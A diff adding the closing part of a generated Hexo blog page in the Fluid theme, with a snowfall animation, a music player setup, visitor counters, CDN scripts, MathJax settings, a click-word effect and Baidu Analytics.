+        //随机生成雪花下落 开始 时left的值，相当于开始时X轴的位置
+        var startLeft = Math.random() * documentWidth;
+
+        //随机生成雪花下落 结束 时left的值，相当于结束时X轴的位置
+        var endLeft = Math.random() * documentWidth;
+
+        //随机生成雪花大小
+        var flakeSize = 20 + 10 * Math.random();
+
+        //随机生成雪花下落持续时间
+        var durationTime = 4000 + 7000 * Math.random();
+
+        //随机生成雪花下落 开始 时的透明度
+        var startOpacity = 0.7 + 0.3 * Math.random();
+
+        //随机生成雪花下落 结束 时的透明度
+        var endOpacity = 0.2 + 0.2 * Math.random();
+
+        //3、克隆一个雪花模板,定义雪花的初始样式，拼接到页面中
+        flake.clone().appendTo($("body")).css({
+            "left": startLeft,
+            "opacity": startOpacity,
+            "font-size": flakeSize,
+            "top": "-25px",
+        }).animate({ //执行动画
+            "left": endLeft,
+            "opacity": endOpacity,
+            "top": documentHieght
+        }, durationTime, function() {
+            //4、当雪花落下后，删除雪花。
+            $(this).remove(); 
+        });
+    }, millisec);
+  };
+
+  function festival_is_coming(d) {
+      var dateEnd = new Date();
+      var year=dateEnd.getFullYear();
+
+      var dateBegin = new Date(year+"-"+d+" 00:00:00");
+      var dateDiff = dateEnd.getTime() - dateBegin.getTime();
+      var dayDiff = Math.abs(Math.floor(dateDiff / (24 * 3600 * 1000)));
+      return dayDiff <= 3
+  }
+
+  var oldLoad = window.onload;
+
+  var autoplay = 'true' === 'true'
+  var loop = 'true' === 'true'
+  var songs = [{"name":"さみしい夜道","artist":"三澤康広","url":"/bgm/main.mp3","cover":"/img/bgm-main.png"}]
+
+    
+    var autoplay = false;
+    var loop = false;
+  
+
+  
+
+  
+
+  
+  window.onload = function () {
+    new APlayer({
+      container: document.getElementById('aplayer'),
+      fixed: true,
+      autoplay: autoplay,
+      loop: loop,
+      order: 'random',
+      theme: '#b7daff',
+      preload: 'none',
+      audio: songs
+    });
+    oldLoad && oldLoad();
+  }
+</script>
+
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+
+    var slogan = document.getElementById('subtitle').title;
+    if (slogan == "与地球重修旧好") {
+      var typed = new Typed('#subtitle', {
+        strings: [
+          '  ',
+          "与地球重修旧好 (1/3)",
+          "与地球重修旧好 (2/3)",
+          "与地球重修旧好 (3/3)",
+          "地球已离线，重试中..."
+        ],
+        cursorChar: "丨",
+        typeSpeed: 70,
+        loop: true,
+      });
+    }
+    else {
+      var typed = new Typed('#subtitle', {
+        strings: [
+          '  ',
+          slogan+"&nbsp;"
+        ],
+        cursorChar: "丨",
+        typeSpeed: 70,
+        loop: false,
+      });
+    }
+
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+
+</script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-svg.js" ></script>
+
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
